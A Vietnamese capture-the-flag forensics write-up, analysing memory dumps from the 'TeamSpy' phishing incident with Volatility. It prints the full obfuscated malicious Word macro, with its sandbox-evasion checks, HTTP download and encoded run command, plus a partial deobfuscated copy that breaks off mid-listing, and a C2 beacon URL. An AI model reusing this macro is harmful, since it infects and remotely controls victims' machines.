## Description
> An employee reported that his machine started to act strangely after receiving a suspicious email with a document file. The incident response team captured a couple of memory dumps from the suspected machines for further inspection. As a soc analyst, analyze the dumps and help the IR team figure out what happened!
### Resource 
- http://www.reconstructer.org/papers/_Analyzing%20MSOffice%20malware%20with%20OfficeMalScanner.zip
- https://github.com/volatilityfoundation/volatility/wiki/Command%20Reference
## Attack method
```mermaid
flowchart TB
    subgraph "Kẻ tấn công"
        A1[karenmiles@t-online.de]
        A2[lloydchung@allsafecybersec.com]
        A3[Armada Collective]
    end

    subgraph "Email lừa đảo"
        B1[bank_statement_088452.doc]
        B2[Important_ECORP_Lawsuit_Washington_Leak.rtf]
    end

    subgraph "Nạn nhân 1 - Philip Price"
        C1[Hàm UsoJar]
        C2[TeamViewer độc hại v0.2.2.2]
        C3[Remote Access]
        C4[C2 Server: 54.174.131.235]
    end

    subgraph "Nạn nhân 2 - Scott Knowles"
        D1[Shellcode]
        D2[ecorpav.exe/PlugX RAT]
        D3[C2 Server: 52.90.110.169]
        D4[reports.rar]
        D5[linuxav.deb]
    end

    subgraph "Mục tiêu cuối"
        E1[E Coin Servers]
        E2[Đòi tiền chuộc 5 BTC]
    end

    A1 --> B1
    A2 --> B2
    B1 --> C1
    C1 --> C2
    C2 --> C3
    C3 --> C4
    
    B2 --> D1
    D1 --> D2
    D2 --> D3
    D2 --> D4
    D2 --> D5
    
    D5 --> E1
    A3 --> E2

    style A1 fill:#ff9999
    style A2 fill:#ff9999
    style A3 fill:#ff9999
    
    style B1 fill:#ffcc99
    style B2 fill:#ffcc99
    
    style C1 fill:#99ff99
    style C2 fill:#99ff99
    style C3 fill:#99ff99
    style C4 fill:#99ff99
    
    style D1 fill:#99ccff
    style D2 fill:#99ccff
    style D3 fill:#99ccff
    style D4 fill:#99ccff
    style D5 fill:#99ccff
    
    style E1 fill:#ff99cc
    style E2 fill:#ff99cc
```

## Solution
##### Bài này cho ta 2 folder để phân tích, nó bao gồm 2 máy của 2 nhân viên nhận được tài liệu độc hại
### ecorpoffice
#### 1. What is the PID the malicious file is running under?
##### Như thường lệ ta sử dụng plugin pstree để xem các tiến trình đang chạy trên máy 
```
┌──(kali㉿kali)-[~/Personal/CTF/volatility]
└─$ python2 vol.py -f ~/Downloads/Cyberdefender/93-TeamSpy/ecorpoffice/win7ecorpoffice2010-36b02ed3.vmem --profile=Win7SP1x64 pstree    
Volatility Foundation Volatility Framework 2.6.1
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xfffffa80036c81b0:wininit.exe                       412    344      3     77 2016-10-04 12:05:23 UTC+0000
. 0xfffffa8003631300:services.exe                     460    412     10    238 2016-10-04 12:05:23 UTC+0000
.. 0xfffffa8003fc4680:VGAuthService.                 1280    460      3     87 2016-10-04 12:05:24 UTC+0000
.. 0xfffffa8003597060:SearchIndexer.                 3180    460     15    786 2016-10-04 12:06:17 UTC+0000
... 0xfffffa80020b9960:SearchProtocol                3692   3180     13    534 2016-10-05 03:05:07 UTC+0000
... 0xfffffa8001b3d060:SearchFilterHo                3924   3180      5     86 2016-10-05 03:05:07 UTC+0000
.. 0xfffffa800300d7c0:svchost.exe                     644    460     11    359 2016-10-04 12:05:24 UTC+0000
... 0xfffffa80040bf060:WmiPrvSE.exe                  1580    644     11    235 2016-10-04 12:05:59 UTC+0000
.. 0xfffffa8003697290:svchost.exe                     900    460     17    414 2016-10-04 12:05:24 UTC+0000
... 0xfffffa8003d49060:dwm.exe                       2460    900      3     72 2016-10-04 12:06:11 UTC+0000
.. 0xfffffa8003d09140:taskhost.exe                   2380    460     10    175 2016-10-04 12:06:11 UTC+0000
.. 0xfffffa80039cbb30:svchost.exe                     924    460     22    575 2016-10-04 12:05:24 UTC+0000
.. 0xfffffa80036e2060:svchost.exe                     928    460     39   1031 2016-10-04 12:05:24 UTC+0000
.. 0xfffffa80041726e0:sppsvc.exe                      860    460      4    152 2016-10-04 12:07:51 UTC+0000
.. 0xfffffa80035bb810:svchost.exe                     816    460     19    479 2016-10-04 12:05:24 UTC+0000
.. 0xfffffa8003fc9b30:vmtoolsd.exe                   1336    460     10    302 2016-10-04 12:05:24 UTC+0000
... 0xfffffa80042beb30:cmd.exe                       1920   1336      0 ------ 2016-10-05 03:05:11 UTC+0000
.... 0xfffffa80042e4060:ipconfig.exe                 3348   1920      0 ------ 2016-10-05 03:05:11 UTC+0000
.. 0xfffffa80033ac7c0:vmacthlp.exe                    708    460      3     57 2016-10-04 12:05:24 UTC+0000
.. 0xfffffa8002a77b30:msdtc.exe                      1996    460     12    136 2016-10-04 12:05:59 UTC+0000
.. 0xfffffa8003cad060:svchost.exe                    2232    460     13    354 2016-10-04 12:06:06 UTC+0000
.. 0xfffffa8004289490:OSPPSVC.EXE                    3532    460      4    130 2016-10-04 12:06:21 UTC+0000
.. 0xfffffa8003a23b30:spoolsv.exe                    1112    460     16    344 2016-10-04 12:05:24 UTC+0000
.. 0xfffffa8004100060:dllhost.exe                    1772    460     14    192 2016-10-04 12:05:59 UTC+0000
.. 0xfffffa8003535060:svchost.exe                     752    460      9    301 2016-10-04 12:05:24 UTC+0000
.. 0xfffffa8003748b30:svchost.exe                     372    460     15    639 2016-10-04 12:05:24 UTC+0000
.. 0xfffffa8003c2bb30:svchost.exe                    1144    460     19    306 2016-10-04 12:05:24 UTC+0000
.. 0xfffffa80036eaa60:svchost.exe                    2940    460      5     75 2016-10-04 12:06:14 UTC+0000
. 0xfffffa8003a52910:lsass.exe                        476    412      8    666 2016-10-04 12:05:23 UTC+0000
. 0xfffffa800383f700:lsm.exe                          484    412     10    196 2016-10-04 12:05:23 UTC+0000
 0xfffffa800336a060:csrss.exe                         360    344     10    469 2016-10-04 12:05:22 UTC+0000
. 0xfffffa800248a750:conhost.exe                     1940    360      0 ------ 2016-10-05 03:05:11 UTC+0000
 0xfffffa80018af9e0:System                              4      0     97    366 2016-10-04 12:05:22 UTC+0000
. 0xfffffa80027ba470:smss.exe                         280      4      2     30 2016-10-04 12:05:22 UTC+0000
 0xfffffa8003d4cb30:explorer.exe                     2492   2436     25    800 2016-10-04 12:06:11 UTC+0000
. 0xfffffa8003e06b30:vmtoolsd.exe                    2708   2492      7    183 2016-10-04 12:06:11 UTC+0000
. 0xfffffa8003e14060:chrome.exe                      2896   2492      0 ------ 2016-10-04 12:06:14 UTC+0000
. 0xfffffa8003dbc8e0:OUTLOOK.EXE                     2692   2492     29   2082 2016-10-05 03:05:06 UTC+0000
 0xfffffa8003a7b060:winlogon.exe                      552    404      3    112 2016-10-04 12:05:23 UTC+0000
 0xfffffa8003fb49f0:csrss.exe                         428    404     11    363 2016-10-04 12:05:23 UTC+0000
 0xfffffa8003ec7a70:SkypeC2AutoUpd                   1364   2528     15   1951 2016-10-04 12:07:51 UTC+0000

```
##### Có 1 vài tiến trình khá khả nghi đang chạy như là cmd.exe và SkypeC2AutoUpdate.exe
##### Tiến trình OUTLOOK.EXE đang chạy, có vẻ đây là nơi chứa email độc hại được nhắc đến trong mô tả.
##### Tiếp tục sử dụng plugin malfind thì process SkypeC2AutoUpdate.exe khá là đáng ngờ, bởi vì đây không phải tệp thực thi mặc định của hệ thống. 
![image](https://hackmd.io/_uploads/rymh9ywKyx.png)
##### Tìm kiếm trên internet ta cũng sẽ dễ dàng tìm thấy các báo cáo về nó như trang [otx.alienvault.com]( https://otx.alienvault.com/indicator/file/0817aaf13a68541c733c929583113da2c7d021376ecb5b0ae705ca6c7c0e3d83)

> Vì vậy PID sẽ là 1364

#### 2. What is the C2 server IP address?
##### Với câu hỏi này, ta sử dụng plugin netscan để xem các kết nối của chúng tới C2 server
![image](https://hackmd.io/_uploads/HJ87ylwYyl.png)

> 54.174.131.235

#### 3. What is the Teamviewer version abused by the malicious file?
##### Dựa vào báo cáo đã tìm thấy phía trên, ta thấy rằng có 1 vài http request sẽ được gửi đến máy chủ C2 với path là `/getinfo.php`
![image](https://hackmd.io/_uploads/B18lIIsK1l.png)
##### Vì máy chủ C2 trong challenge có ip là 54.174.131.235 cho nên uri sẽ là `54.174.131.235/getinfo.php`
##### Dựa vào thông tin này ta tiến hành tìm trong file memory của nạn nhân
![image](https://hackmd.io/_uploads/BkHSDLjFke.png)
##### Ta tiến hành phân tích url đáng ngờ được kết nối đến 
```
http://54.174.131.235/getinfo.php?id=528812561&stat=1&tout=10&osbt=2&osv=6.1&osbd=7600&ossp=0.0&ulv=2&elv=0&rad=0&agp=1&devicea=0&devicev=0&uname=phillip.price&cname=WIN-191HVE3KTLO&vpn=0&tvrv=0.2.2.2
```
##### Endpoint: /getinfo.php → Gợi ý máy chủ đang thu thập thông tin từ client.
| Tham số  | Giá trị            | Ý nghĩa khả nghi                                   |
|----------|--------------------|----------------------------------------------------|
| `id`     | `528812561`        | Có thể là ID của máy bị nhiễm                     |
| `osv`    | `6.1`              | Windows 7                                         |
| `osbd`   | `7600`             | Windows 7 RTM (chưa có Service Pack)              |
| `ossp`   | `0.0`              | Không có Service Pack                             |
| `uname`  | `phillip.price`    | Tên người dùng hệ thống                          |
| `cname`  | `WIN-191HVE3KTLO`  | Tên máy tính                                      |
| `vpn`    | `0`                | Không sử dụng VPN                                |
| `tvrv`   | `0.2.2.2`          | Có thể là phiên bản phần mềm độc hại             |
> Phiên bản là 0.2.2.2
#### 4. What password did the malicious file use to enable remote access to the system?
##### Với câu hỏi này mình sử dụng plugin editbox
```
EditBox là một thành phần giao diện đồ họa (GUI) của Windows, thuộc nhóm Windows Controls. Nó là một hộp nhập liệu (text box) cho phép người dùng nhập và chỉnh sửa văn bản.
Dữ liệu trong EditBox được lưu trong bộ nhớ RAM, và có thể bị trích xuất bằng công cụ pháp y như Volatility.
```
![image](https://hackmd.io/_uploads/H1Vz9IjtJe.png)
> P59fS93m

#### 5. What was the sender's email address that delivered the phishing email?
```
Tệp .pst (Personal Storage Table) là một định dạng tệp được Microsoft Outlook sử dụng để lưu trữ dữ liệu email và các thông tin cá nhân khác
Tệp .pst lưu trữ trên máy tính, cho phép người dùng truy cập email và dữ liệu mà không cần kết nối internet.
Tệp .pst thường được lưu ở các vị trí sau, tùy thuộc vào hệ điều hành:

    Windows 10/11:
    C:\Users\<Tên người dùng>\Documents\Outlook Files\
    Windows 7/8/XP:
    C:\Users\<Tên người dùng>\AppData\Local\Microsoft\Outlook\
```
##### Theo đó ta tiến hành quét các file trong thư mục này trước 
![image](https://hackmd.io/_uploads/ByoSozDt1x.png)
##### Thấy rằng có 1 tệp pst được tạo ra cho tài khoản email `phillip.price@e-corp.biz`
##### Oke, bây giờ dump nó ra bằng plugin dumpfiles. Bởi vì nó có khá nhiều file pst nên ta sử dụng option `-r pst$` để dump hết tất cả các file có đuôi pst
![image](https://hackmd.io/_uploads/r1NfaGwFJl.png)
##### Tiếp theo dùng pffexport để xuất các mục được lưu trữ trong file pst, ta thu được 4 folder như sau:
![image](https://hackmd.io/_uploads/HkDiTMwKJe.png)
##### Kiểm tra lần lượt từng folder và các email của nạn nhân, mình tìm thấy email như sau được gửi từ email `karenmiles@t-online.de` (nằm tại .../Top of Outlook data file/Inbox/Message00011)
![image](https://hackmd.io/_uploads/BJ9furvKyx.png)
##### Đồng thời cũng có 1 file đính kèm được nhận
![image](https://hackmd.io/_uploads/Hkj5OSwtye.png)
##### Khi kiểm tra file này có chứa các đoạn macro bị obfucated khá đáng ngờ, khả năng rất cao đây là email phishing.

> Đáp án là karenmiles@t-online.de

#### 6. What is the MD5 hash of the malicious document?
```
┌──(kali㉿kali)-[~/…/Top of Outlook data file/Inbox/Message00011/Attachments]
└─$ md5sum 1_bank_statement_088452.doc                            
c2dbf24a0dc7276a71dd0824647535c9  1_bank_statement_088452.doc
```
#### What is the bitcoin wallet address that ransomware was demanded?
##### Tiếp tục xem các email khác, 1 email tống tiền khác được nhận bởi `phillip.price@e-corp.biz` 
![image](https://hackmd.io/_uploads/SymOnHPYJe.png)
#### 7. What is the ID given to the system by the malicious file for remote access?
##### Từ đầu ra của câu hỏi số 4 ta cũng dễ dàng xác định được ID
![image](https://hackmd.io/_uploads/ryaTqLiF1g.png)

#### 8. What is the IPv4 address the actor last connected to the system with the remote access tool?
![image](https://hackmd.io/_uploads/ry7Rjwjt1g.png)


#### 9. What Public Function in the word document returns the full command string that is eventually run on the system?
##### Phân tích file macro được đính kèm trong email
<details>
    <summary>
        Source
    </summary>

```python
Dim lcLLcaZ As Boolean
Public Sub Img_Painted(ByVal hHZIubL As Long, ByVal AoLnF As IInkRectangle)
If lcLLcaZ Then Exit Sub
lcLLcaZ = True
xvkBjM
End Sub
Public Sub xvkBjM()
    On Error GoTo DoWhOs
    onTriEc
    PdSnMAm
    vBhkpG
    oADSc
    suDVZ
    Set gDFGB = CreateObject(pEEyJqs)
    WFCWFf gDFGB.Run(UsoJar, 0)
    MsgBox ("Invalid Macro Format")
Exit Sub
DoWhOs:
MsgBox (666)
    End Sub

Public Function pEEyJqs() As String
    pEEyJqs = a("c.loWpeOQrSAiStlCEihhi", 229, 158)
End Function

Public Function UsoJar() As String
    UsoJar = dbgKnG(a("AHABJACABZAEuBbYEoQRMA9AAwABQAQABwAHABIAG3BIECsAcMAuAbEAlwAAABAAGABdAHpAIADsBb4HuQU4ApgAsABAAGABQAHABYAHUBIUH0AJwAvg1EAyAAIABQAHABbAHvBNAG0BLwH3AZ4AvQAwAAwAEAAaAGABMAHlBcUDpgcYApgAQABwAkABAAHABZACWBZUG0QaYCvgZ4AuQAMABQACAAMAHgAbAHyBK8H0QVkAggAIABQAHAAAAGABbAHiAZkGiAb4Asw)UAjAAUABwAHAAVADBBdgDiBd4GuQZUAFwA0ABQAHABZADABYAG1BIwG4QYwAwAAUALAAQAAAAFABLAHlBLUHfANwEwARQAhQA0ABgAGABcAChALAChBZIHTgbUAlgA8AAwAvABwACABUAGlBcEClAOgAvgToApwAQABAAGABIAFlALMDkBIAGuwbkA2gAMABAACAAZAFABYAGlBZgCuQUgA0gAYAQwAIABQA" & _
    "HABdACsBeMCiALwHowaQAVwAoABwACAAUAGvAdAG2AQMDjQI4AyQAUABQAIAAQAGABZACvBLIG2gZQAyAOQAuQAAABAAEAAZACrAeICzAbkFswQQAkQA8ABQACABiACABIACyBTAGiAcQAugAMAUAAcABAAFAAZAG4BdkClQMIClwbkA1AAUABwAGABQAD+AdAGsBV8HigdYA0gAYABQAUABAACAAaAEzBZUD2AIIAzgZgAyQAQABgAGABdAGoAM_D2BZIClgZoAoAA0ABgACABQAGABZAElAZsGngU8AiAAEAugAsABwAGAAcAHlBIICugN8HGQIIADQAAABAAFAAaAHAAIAGsAZcF3AZIA0AAQAAgAYAAQAFABYACfAc4CswaUA0wIkAtwAIAAgAGAAcACuBXADsBbwG0Qa0AQAAEABQACAAgACAAZAGtBeQCuQKIAiAA4AiAAcABQACABZACkBZAG3qNIHvge4A5wAEABg", 353, 469))
    End Function
Public Sub onTriEc()
    If dOjcu(kiBGvvL) Then Error 102
End Sub

Public Function kiBGvvL() As String
    kiBGvvL = QEZxF(ActiveDocument.Name)
End Function

Public Function QEZxF(ByVal KlcjY As String) As String
    QEZxF = Left(KlcjY, OmrGJ(KlcjY, a("ZQAwYIOR.Y", 43, 58)) - 1)
End Function

Public Function OmrGJ(ByVal jtXLgF As String, ByVal kGBektc As String) As Integer
    OmrGJ = InStr(jtXLgF, kGBektc)
End Function

Public Function dOjcu(ByVal BsZqVA As String) As Boolean
    oimpaL = 1
    For rpsinZt = 1 To Len(BsZqVA)
    If yDIrHQ(wlYzxRW, wDKyZC(BsZqVA, rpsinZt)) Then
    oimpaL = oimpaL + 1
    End If
    Next
    dOjcu = oimpaL = rpsinZt
End Function

Public Function wlYzxRW() As String
    wlYzxRW = a("90E7EE5DC3jA1j8HF6fD4IB2M", 86, 26)
End Function

Public Function wDKyZC(ByVal BsZqVA As String, ByVal rpsinZt As Integer) As String
    wDKyZC = bAxiit(wqoNKXd(BsZqVA, rpsinZt), 1)
End Function

Public Function bAxiit(ByVal BsZqVA As String, ByVal rpsinZt As Integer) As String
    bAxiit = Right(BsZqVA, rpsinZt)
End Function

Public Function wqoNKXd(ByVal BsZqVA As String, ByVal rpsinZt As Integer) As String
    wqoNKXd = Left(BsZqVA, rpsinZt)
End Function

Public Function yDIrHQ(ByVal jtXLgF As String, ByVal kGBektc As String) As Boolean
    yDIrHQ = InStr(LCase(jtXLgF), LCase(kGBektc)) <> 0
End Function

Public Sub suDVZ()
    gHduxL = nkVlF
    If Not yDIrHQ(gHduxL, a(" l;dsNEe;tTnIaeNT usNR", 173, 216)) Then Error 105
    If NPcRxvo(gHduxL, JhJZYGg) Then Error 106
End Sub

Public Function JhJZYGg()
    JhJZYGg = Array(a("DHheTAoDFoseSqT", 19, 62), a("OTNTNfaYfRieuoZzw", 60, 59), a("tvdnopElnCzTaewtrTA", 187, 59), a("TSnZjaoCPeihbBCaoURXDgLkkm", 61, 169), a("cunFTNvysQlprAEl", 95, 34), _
    a("oJOCPNjPkOGqIgfoRtz", 183, 61), a("MAORQYaWalyJX", 101, 97), a("WIYirVNdKXwxtsEIUEn", 66, 54), a("sHHDEnzsejWRDNsT", 87, 17), a("dDRvsSjNbaTUAOHiKlegPearW", 114, 95), _
    a("IomZPScdmCxLoSaaE", 26, 31), a("JEGpiWssHMTnqTZO", 55, 24), a("xjdETaCIdEDpgMaZvU", 179, 28), a("tZACXbnUjTFosorcim", 179, 89), a("cNRxJtrcSdFYpyiUe", 25, 42), _
    a("CjCiCMDzEeenmdIWb", 99, 97), a("tdcnMrVgVaHoTeneOfx", 199, 45), a("ldRuEwtjnqeKCRastcA", 169, 20), a("CDRgcNcMaSeEOQPI", 107, 153), a("tRYSvkIEkntFeEXr", 43, 59), _
    a("tScebwiEpBgtLaEhA", 53, 165), a("ZmUnSKYeaUXnydOGon", 139, 80), a("ioVbPDLzkoucBj", 65, 67), a("APkEBTvzPHjotlA oL", 35, 109), a("BtEFenCKPIRgiOonjpf", 34, 189), _
    a("YEREezcLrpOjFLn", 28, 119), a("EREtnec atAduYFcZCIk", 179, 31), a("EMFCNEvBXsaTEBrSR", 181, 23), a("mWWirEKtItVJsRKAHU", 31, 189), a("onyVbEaXfUlCtOCFu", 23, 174), _
    a("Pm.PPLpdSehHEILecEh", 128, 37), a("dOQtMrerIVeeCPSNrGf", 61, 41), a("nzTaxlGZBBAOIZm", 139, 160), a("FaKeLYtLrKspOa$|", 563, 673), a("ToQoaGNPrIY UTrlPK", 41, 117), _
    a("ncODiT nieYoElSISgHgjyRtoEyp", 241, 44), a("wJBDEeKLUienRkAHtFdr", 67, 182), a("StobccxZjiOzwF", 75, 102), a("UTrOiE sNMrOdCoMOdfE", 49, 161), a("eoabt RTLmcgEuwoFA", 23, 129), _
    a("sAPHVUgtsElSLIoVQ", 45, 54), a("EKEESMovkIlrxIr", 56, 154), a("XBTOLZOrofHDCcS", 73, 134), a("tzsgSshDOVyAH AV", 103, 152), a("wAJhVemMTOVltGUD", 109, 42), _
    a("ACEmImwHPPdOzxYts", 186, 39), a("eDltWp,Ns IsSEppSbo", 117, 51), a("NIItOPdRtLoRoTDRG", 39, 19), a("XlCbMnsPAQeEakSezSLG", 51, 124), a("EzGRSHtCBcaToLIB", 147, 145))
End Function

Public Function nkVlF() As String
    Set FiFmr = CreateObject(a("ti1pHOetvu.msib.HW.tnxRtXqpBeWJtnj5", 229, 297))
    UprHnv FiFmr.Open(Xjehdnv, ZiJGpD, False)
    UprHnv FiFmr.SetRequestHeader(a("wUrnneJYfAWernRe", 109, 126), a("drmnpewomHsnarha/-mwmyc:dtetxlaow/-b/.estmodF.eik/c-spic", 181, 518))
    UprHnv FiFmr.SetRequestHeader(a("-rteueUqADErGnsbgqF", 84, 196), a(" t/at6W cznrs7i4j/.iMoici .b.x50nSmlhdN0l0R.;dIplUeT;e M0 oEaagn  ;(o)Tw", 733, 631))
    UprHnv FiFmr.Send
    If FiFmr.Status = 200 Then
    nkVlF = FiFmr.ResponseText
    End If
End Function

Public Function Xjehdnv() As String
    Xjehdnv = a("TPGdZvPEneXX", 65, 50)
End Function

Public Function ZiJGpD() As String
    ZiJGpD = a("cem:yioi/Ptin/VypdwX//.wHmvcwhe2o.tk.mmtW1/apc/gxsJ", 515, 437)
End Function

Public Function NPcRxvo(ByVal jtXLgF As String, ByVal fpTnz) As Boolean
    For Each kGBektc In fpTnz
    If yDIrHQ(jtXLgF, kGBektc) Then GoTo XoBswf
    Next
    Exit Function
XoBswf:
    NPcRxvo = True
End Function

Public Sub UprHnv(ByVal cSZazM)
End Sub

Public Sub PdSnMAm()
    If lnOSLii < qUjazBv Then Error 101
End Sub

Public Function lnOSLii() As Integer
    lnOSLii = RecentFiles.Count
End Function

Public Function qUjazBv() As Integer
    qUjazBv = 3
End Function

Public Sub oADSc()
    For Each ERucnn In qBBOT
    If NPcRxvo(ERucnn.Name, pzJLZe) Then Error 104
    Next
End Sub

Public Function qBBOT()
    Set qBBOT = Tasks
End Function

Public Function pzJLZe()
    pzJLZe = Array(a("OlNVvXriBMlNK", 96, 81), a("IaNCeKfwHFJRrcUsGi", 173, 151), a("nNWmtSjeaOoPinOy UsZCrRt", 179, 83), a("amsaAejRJtdSHXUvt", 134, 134), a("MMtmYVoKQaIqNut", 64, 144), _
    a("bDVFlCexdEIkkrLL", 55, 147), a("ITuyGoIA aSVcezicSblU", 178, 137), a("iF2SxlB3NCS&emaDLoaDfay ", 611, 306), a("QPEOG RvSepSrTeOAClJOpaRX", 122, 151), a("sA1^pBar alWn2OlTvFLq`TX uIe", 541, 421), _
    a("rTEdGipwVBsPBWcw", 77, 161))
End Function

Public Sub vBhkpG()
    If peoae < OPGUHO Then Error 103
End Sub

Public Function OPGUHO() As Integer
    OPGUHO = 50
End Function

Public Function peoae() As Integer
    peoae = qrINMhu(Tasks)
End Function

Public Function qrINMhu(ByVal theol) As Integer
    qrINMhu = theol.Count
End Function

Public Function IRgUj(ByVal yUxTd As String, ByVal iTlaj As Integer, ByVal ZryGvE As Integer) As String
    rpsinZt = gLqcewo(ZryGvE, Len(yUxTd))
    Do While Len(IRgUj) < Len(yUxTd) - EUNtKzW
    IRgUj = IRgUj & hOxaO(yUxTd, rpsinZt)
    rpsinZt = gLqcewo((rpsinZt + iTlaj), Len(yUxTd))
    Loop
End Function

Public Function gLqcewo(ByVal yKDOpaf As Integer, ByVal fWLEH As Integer) As Integer
    gLqcewo = yKDOpaf Mod fWLEH
End Function

Public Function EUNtKzW() As Integer
    EUNtKzW = Err.Number
End Function

Public Function LjYfFZ() As String
    LjYfFZ = Err.Source
End Function

Public Sub zfczEsA(ByVal nPRlMCQ, ByVal JtQEXgz As Integer, ByVal ltmja As String)
    nPRlMCQ.Raise JtQEXgz, ltmja
End Sub

Public Function hOxaO(ByVal BsZqVA As String, ByVal rpsinZt As Integer) As String
    hOxaO = wDKyZC(BsZqVA, rpsinZt + 1)
End Function

Public Function a(ByVal yUxTd As String, ByVal iTlaj As Integer, ByVal ZryGvE As Integer) As String
    On Error Resume Next
    zfczEsA Err, 9, yUxTd
    a = IRgUj(LjYfFZ, iTlaj, ZryGvE)
End Function

Public Function dbgKnG(ByVal bbqhfZp As String) As String
    dbgKnG = DzEyA & bbqhfZp
End Function

Public Function DzEyA() As String
    DzEyA = a("1pe  eC Mr-apda#olb-noZtses enbwlyncm0]hps-ddae poom", 119, 53)
End Function

Public Function WFCWFf(ByVal rHdXPf)
    WFCWFf = rHdXPf
End Function

```
    
</details>

##### Ta tiến hành sửa mã lại để dễ đọc hơn

<details>
    <summary>
        Mã sau khi sửa
    </summary>

```
    '===============================
' Danh sách ánh xạ tên cũ → tên mới:
'
' lcLLcaZ           → isProcessed
' Img_Painted       → OnImagePainted
'
' xvkBjM            → ExecuteMainRoutine
' onTriEc           → CheckDocumentNameValidity
' PdSnMAm           → CheckRecentFilesCount
' vBhkpG            → CheckTasksCount
' oADSc             → CheckTaskNames
' suDVZ             → ValidateDownloadedContent
'
' pEEyJqs           → GetCOMObjectName
' UsoJar            → GetRunCommand
'
' kiBGvvL           → GetDocumentBaseName
' QEZxF             → ExtractFileNamePrefix
' OmrGJ             → FindSubstringPosition
'
' dOjcu             → IsNameValid
' wlYzxRW           → AllowedChars
' wDKyZC            → GetCharAtPosition
' bAxiit            → RightSubstring
' wqoNKXd           → LeftSubstring
' yDIrHQ            → ContainsIgnoreCase
'
' gHduxL            → downloadedContent
' nkVlF             → DownloadContent
' FiFmr             → httpRequest
' UprHnv            → HTTPRequestCall
' Xjehdnv           → GetRequestMethod
' ZiJGpD            → GetRequestURL
'
' NPcRxvo           → ContainsBlockedKeyword
' JhJZYGg           → BlockedKeywords
'
' lnOSLii           → GetRecentFilesCount
' qUjazBv           → MinimumRecentFilesCount
'
' qBBOT             → GetTasks
' pzJLZe            → BlockedTaskNames
'
' OPGUHO            → MinimumTasksCount
' peoae             → GetTasksCount
' qrINMhu           → GetCount
'
' IRgUj             → DecodeString
' yUxTd             → inputStr
' iTlaj             → stepVal
' ZryGvE            → offsetVal
' rpsinZt           → indexPos
'
' gLqcewo           → Modulo
'
' EUNtKzW           → GetErrorNumber
' LjYfFZ            → GetErrorSource
'
' zfczEsA           → RaiseError
' nPRlMCQ           → errObject
' JtQEXgz           → errorCode
' ltmja             → errorSource
'
' hOxaO             → GetNextChar
'
' a                 → DecodeData
'
' dbgKnG            → PrependPrefix
' bbqhfZp           → inputData
'
' DzEyA             → GetPrefix
'
' WFCWFf            → EchoValue
'===============================

Dim isProcessed As Boolean

Public Sub OnImagePainted(ByVal unusedParam As Long, ByVal unusedRect As IInkRectangle)
    If isProcessed Then Exit Sub
    isProcessed = True
    ExecuteMainRoutine
End Sub

Public Sub ExecuteMainRoutine()
    On Error GoTo HandleError

    CheckDocumentNameValidity
    CheckRecentFilesCount
    CheckTasksCount
    CheckTaskNames
    ValidateDownloadedContent

    Dim comObject As Object
    Set comObject = CreateObject(GetCOMObjectName)
    EchoValue comObject.Run(GetRunCommand, 0)
    
    MsgBox "Invalid Macro Format"
    Exit Sub
HandleError:
    MsgBox 666
End Sub

Public Function GetCOMObjectName() As String
    GetCOMObjectName = DecodeData("c.loWpeOQrSAiStlCEihhi", 229, 158)
End Function

Public Function GetRunCommand() As String
    GetRunCommand = PrependPrefix( _
        DecodeData("AHABJACABZAEuBbYEoQRMA9AAwABQAQABwAHABIAG3BIECsAcMAuAbEAlwAAABAAGABdAHpAIADsBb4HuQU4ApgAsABAAGABQAHABYAHUBIUH0AJwAvg1EAyAAIABQAHABbAHvBNAG0BLwH3AZ4AvQAwAAwAEAAaAGABMAHlBcUDpgcYApgAQABwAkABAAHABZACWBZUG0QaYCvgZ4AuQAMABQACAAMAHgAbAHyBK8H0QVkAggAIABQAHAAAAGABbAHiAZkGiAb4Asw") & _
        "UAjAAUABwAHAAVADBBdgDiBd4GuQZUAFwA0ABQAHABZADABYAG1BIwG4QYwAwAAUALAAQAAAAFABLAHlBLUHfANwEwARQAhQA0ABgAGABcAChALAChBZIHTgbUAlgA8AAwAvABwACABUAGlBcEClAOgAvgToApwAQABAAGABIAFlALMDkBIAGuwbkA2gAMABAACAAZAFABYAGlBZgCuQUgA0gAYAQwAIABQA"), 353, 469)
End Function

Public Sub CheckDocumentNameValidity()
    If IsNameValid(GetDocumentBaseName) Then Err.Raise 102
End Sub

Public Function GetDocumentBaseName() As String
    GetDocumentBaseName = ExtractFileNamePrefix(ActiveDocument.Name)
End Function

Public Function ExtractFileNamePrefix(ByVal fullName As String) As String
    ExtractFileNamePrefix = Left(fullName, FindSubstringPosition(fullName, DecodeData("ZQAwYIOR.Y", 43, 58)) - 1)
End Function

Public Function FindSubstringPosition(ByVal mainStr As String, ByVal subStr As String) As Integer
    FindSubstringPosition = InStr(mainStr, subStr)
End Function

Public Function IsNameValid(ByVal nameStr As String) As Boolean
    Dim charCount As Integer
    charCount = 1
    Dim i As Integer
    For i = 1 To Len(nameStr)
        If ContainsIgnoreCase(AllowedChars, GetCharAtPosition(nameStr, i)) Then
            charCount = charCount + 1
        End If
    Next
    IsNameValid = (charCount = i)
End Function

Public Function AllowedChars() As String
    AllowedChars = DecodeData("90E7EE5DC3jA1j8HF6fD4IB2M", 86, 26)
End Function

Public Function GetCharAtPosition(ByVal textStr As String, ByVal pos As Integer) As String
    GetCharAtPosition = RightSubstring(LeftSubstring(textStr, pos), 1)
End Function

Public Function RightSubstring(ByVal textStr As String, ByVal count As Integer) As String
    RightSubstring = Right(textStr, count)
End Function

Public Function LeftSubstring(ByVal textStr As String, ByVal count As Integer) As String
    LeftSubstring = Left(textStr, count)
End Function

Public Function ContainsIgnoreCase(ByVal mainStr As String, ByVal searchStr As String) As Boolean
    ContainsIgnoreCase = (InStr(LCase(mainStr), LCase(searchStr)) <> 0)
End Function

Public Sub ValidateDownloadedContent()
    Dim downloadedContent As String
    downloadedContent = DownloadContent
    If Not ContainsIgnoreCase(downloadedContent, DecodeData(" l;dsNEe;tTnIaeNT usNR", 173, 216)) Then Err.Raise 105
    If ContainsBlockedKeyword(downloadedContent, BlockedKeywords) Then Err.Raise 106
End Sub

Public Function BlockedKeywords() As Variant
    BlockedKeywords = Array( _
        DecodeData("DHheTAoDFoseSqT", 19, 62), _
        DecodeData("OTNTNfaYfRieuoZzw", 60, 59), _
        DecodeData("tvdnopElnCzTaewtrTA", 187, 59), _
        DecodeData("TSnZjaoCPeihbBCaoURXDgLkkm", 61, 169), _
        DecodeData("cunFTNvysQlprAEl", 95, 34), _
        DecodeData("oJOCPNjPkOGqIgfoRtz", 183, 61), _
        DecodeData("MAORQYaWalyJX", 101, 97), _
        DecodeData("WIYirVNdKXwxtsEIUEn", 66, 54), _
